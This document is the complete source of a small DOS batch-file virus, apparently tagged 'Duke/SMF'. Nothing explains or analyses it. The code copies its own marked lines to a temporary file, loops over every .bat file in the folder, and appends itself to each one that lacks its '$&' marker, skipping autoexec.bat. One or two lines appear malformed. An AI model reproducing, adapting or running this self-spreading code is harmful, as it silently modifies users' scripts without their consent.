@echo off %$&%
if "%1=="@ goto $&z
echo.>$&.bat
find "$&">$&.bat
for %%b in (*.bat) do call $&.bat @ %%b
del $&.bat
goto $&
:$&z [$MF 3.3,Duke/SMF]
if "%2=="autoexec.bat goto $&
find "$&"nul
if errorlevel 1 type $&.bat>>%2
:$&